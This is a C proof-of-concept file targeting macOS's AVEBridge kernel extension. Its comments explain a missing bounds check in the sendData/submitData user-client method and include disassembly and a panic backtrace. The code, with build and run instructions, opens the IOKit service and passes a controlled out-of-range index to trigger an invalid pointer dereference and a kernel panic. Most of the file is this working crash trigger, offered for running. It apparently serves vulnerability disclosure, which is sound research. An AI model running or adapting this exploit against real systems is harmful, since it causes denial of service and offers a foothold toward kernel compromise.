// [usgae]
//    clang -o poc ./poc.c -framework IOKit
//    ./poc
// 
// 
//  When attack wants to call com_apple_AVEBridgeUserClient::sSendData, which is in AVEBridge.kext
//  There is no bounday check when AVEBridge.kext try to read a object pointer.
//  The below is code which cause kernel panic:
//  
//   __text:0000000000000FD2                 push    rbp
//   __text:0000000000000FD3                 mov     rbp, rsp
//   __text:0000000000000FD6                 push    r15
//   __text:0000000000000FD8                 push    r14
//   __text:0000000000000FDA                 push    r13
//   __text:0000000000000FDC                 push    r12
//   __text:0000000000000FDE                 push    rbx
//   __text:0000000000000FDF                 push    rax
//   __text:0000000000000FE0                 mov     rbx, rdx
//   __text:0000000000000FE3                 mov     r14, rsi
//   __text:0000000000000FE6                 mov     r13, rdi
//   __text:0000000000000FE9                 mov     rdi, [r13+r14*8+88h]     ; r14 can be controlled with structInput[0~8]
//   __text:0000000000000FF1                 mov     rax, [rdi]               ; so it might be get an invalid pointer in rdi
//   __text:0000000000000FF4                 mov     rsi, rbx
//   __text:0000000000000FF7                 call    qword ptr [rax+148h]
//   __text:0000000000000FFD                 mov     r15, rax
//   __text:0000000000001000                 test    r15, r15
//   __text:0000000000001003                 jz      loc_108F
//   __text:0000000000001009                 test    rbx, rbx
//   __text:000000000000100C                 jz      short loc_1017
//   __text:000000000000100E                 mov     rax, [rbx]
//   __text:0000000000001011                 mov     rdi, rbx
//   __text:0000000000001014                 call    qword ptr [rax+28h]
//
//  The backtrace , when panic happened, is shown below:
//  frame #0: 0xffffff7f9b3e1ff1 com_apple_AVEBridgeUserClient::submitData
//  frame #1: 0xffffff7f9b3e2952 com_apple_AVEBridgeUserClient::sendData
//  frame #2: 0xffffff8018ecb0b8 kernel`IOUserClient::externalMethod(this=<unavailable>, selector=<unavailable>, args=0x00000000000000ef, dispatch=0xffffff804241fac0, target=0xffffff8035b2aa00, reference=0x00000000000000ef) at IOUserClient.cpp:5289 [opt]
//  frame #3: 0xffffff8018ed3ce7 kernel`::is_io_connect_method(connection=0xffffff8035b2aa00, selector=2, scalar_input=<unavailable>, scalar_inputCnt=<unavailable>, inband_input=<unavailable>, inband_inputCnt=0, ool_input=<unavailable>, ool_input_size=<unavailable>, inband_output=<unavailable>, inband_outputCnt=<unavailable>, scalar_output=<unavailable>, scalar_outputCnt=<unavailable>, ool_output=<unavailable>, ool_output_size=<unavailable>) at IOUserClient.cpp:3945 [opt]
//  frame #4: 0xffffff8018969f24 kernel`_Xio_connect_method(InHeadP=<unavailable>, OutHeadP=0xffffff803fd295e0) at device_server.c:8376 [opt]
//  frame #5: 0xffffff801889910e kernel`ipc_kobject_server(request=0xffffff8041830200, option=<unavailable>) at ipc_kobject.c:351 [opt]
//  frame #6: 0xffffff8018876e3d kernel`ipc_kmsg_send(kmsg=0xffffff8041830200, option=3, send_timeout=0) at ipc_kmsg.c:1852 [opt]
//  frame #7: 0xffffff8018889c4b kernel`mach_msg_overwrite_trap(args=<unavailable>) at mach_msg.c:568 [opt]
//  frame #8: 0xffffff801899917d kernel`mach_call_munger64(state=0xffffff803064f540) at bsd_i386.c:573 [opt]
//  frame #9: 0xffffff8018847996 kernel`hndl_mach_scall64 + 22
// 

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach_error.h>
#include <IOKit/IOKitLib.h>
#include <time.h>

int selector;
char inputStruct[4096];
size_t inputStructCnt = 0x18;
char outputStruct[4096];
size_t outputStructCnt = 0;
uint64_t inputScalar[16];  
uint64_t inputScalarCnt = 0;
uint64_t outputScalar[16];
uint32_t outputScalarCnt = 0;

int main(int argc, char** argv){
  kern_return_t err;

  io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("com_apple_AVEBridge"));
  if (service == IO_OBJECT_NULL){
    printf("[-] unable to find service\n");
    exit(-1);
  }

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(service, mach_task_self(), 0, &conn);
  if (err != KERN_SUCCESS){
    printf("[-] unable to get user client connection\n");
    exit(-1);
  }

  srand(time(NULL));
  outputScalar[0] = random();
  outputStructCnt = 0;

  // 1. open the service .....
  err = IOConnectCallMethod(
      conn,
      0,              
      inputScalar,
      0,
      inputStruct,
      0,
      outputScalar,
      &outputScalarCnt,
      outputStruct,
      &outputStructCnt);
  if(err != KERN_SUCCESS) {
    printf("[-] open AVEBridge service failed.... \n");
    exit(-1);
  }
  else {
    printf("[+] open AVEBridge service succeed... \n");
  }
  fflush(stdout);

  // 2. triggle submitData
  *((uint64_t*)inputStruct) = 0x00004141deadbeef;
  err = IOConnectCallMethod(
    conn,
    2,              
    inputScalar,
    inputScalarCnt,
    inputStruct,
    inputStructCnt,
    outputScalar,
    &outputScalarCnt,
    outputStruct,
    &outputStructCnt); 

  if (err == KERN_SUCCESS) {
    printf("[+] success call it... \n");
  }
  else {
    printf("[-] error message is %s, error_code=%x\n", mach_error_string(err), err);
  }

  printf("not panic?");
  fflush(stdout);

  return 0;
}
